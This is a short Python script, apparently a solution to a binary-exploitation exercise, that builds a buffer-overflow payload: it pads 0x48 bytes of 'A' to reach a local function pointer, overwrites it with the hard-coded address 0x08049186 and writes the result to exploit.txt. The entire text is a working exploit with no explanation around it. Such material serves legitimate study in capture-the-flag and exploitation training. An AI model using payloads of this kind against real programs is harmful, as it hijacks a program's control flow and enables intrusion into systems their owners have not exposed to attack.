# Fill buffer upto local function pointer
payload = b'A'*(0x44+0x4)
# Overwrite local function pointer
payload += b'\x86\x91\x04\x08'
with open('exploit.txt', 'wb') as f:
    f.write(payload)